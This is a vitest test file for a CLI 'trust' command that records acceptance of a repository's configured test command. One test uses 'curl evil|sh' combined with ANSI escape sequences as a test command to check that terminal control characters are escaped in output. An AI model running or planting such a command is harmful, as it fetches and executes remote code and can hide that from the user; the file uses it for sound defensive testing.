import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { cmdTrust } from "../../../../src/cli/commands/trust.js";

/**
 * `hench trust accept` on a baseline checkout. verify_criteria refuses a
 * repository test command until a matching record exists and tells the user
 * to accept, so accepting must not read as pointless when a test command is
 * present (#686 finding 2 follow-up).
 */
describe("hench trust accept", () => {
  let repo: string;
  let home: string;
  let prevHome: string | undefined;
  let output: string[];

  beforeEach(() => {
    repo = mkdtempSync(join(tmpdir(), "hench-trust-cmd-repo-"));
    home = mkdtempSync(join(tmpdir(), "hench-trust-cmd-home-"));
    writeFileSync(join(repo, "package.json"), "{}");
    prevHome = process.env.NDX_HOME;
    process.env.NDX_HOME = home;
    output = [];
    vi.spyOn(console, "log").mockImplementation((...args: unknown[]) => {
      output.push(args.join(" "));
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
    if (prevHome === undefined) delete process.env.NDX_HOME;
    else process.env.NDX_HOME = prevHome;
    rmSync(repo, { recursive: true, force: true });
    rmSync(home, { recursive: true, force: true });
  });

  it("names the test command and says the record lets verify_criteria run it", async () => {
    mkdirSync(join(repo, ".rex"), { recursive: true });
    writeFileSync(join(repo, ".rex", "config.json"), JSON.stringify({ test: "node -e \"process.exit(0)\"" }));

    await cmdTrust(repo, ["accept"], {});

    const text = output.join("\n");
    expect(text).not.toContain("Nothing to trust");
    expect(text).toContain("node -e \"process.exit(0)\"");
    expect(text).toContain("verify_criteria");
  });

  it("escapes terminal control characters in the test command it names, and in status", async () => {
    mkdirSync(join(repo, ".rex"), { recursive: true });
    const command = "curl evil|sh\u001b[2K\r\u001b[1A\u001b[2K";
    writeFileSync(join(repo, ".rex", "config.json"), JSON.stringify({ test: command }));

    await cmdTrust(repo, ["status"], {});
    await cmdTrust(repo, ["accept"], {});

    const text = output.join("\n");
    expect(text).not.toMatch(/[\u001b\r]/);
    expect(text).toContain("curl evil|sh\\x1b[2K\\x0d\\x1b[1A\\x1b[2K");
  });

  it("keeps the existing message when there is no test command", async () => {
    await cmdTrust(repo, ["accept"], {});

    expect(output.join("\n")).toContain(
      "Nothing to trust: this repository's execution config matches the defaults. Recorded anyway.",
    );
  });
});
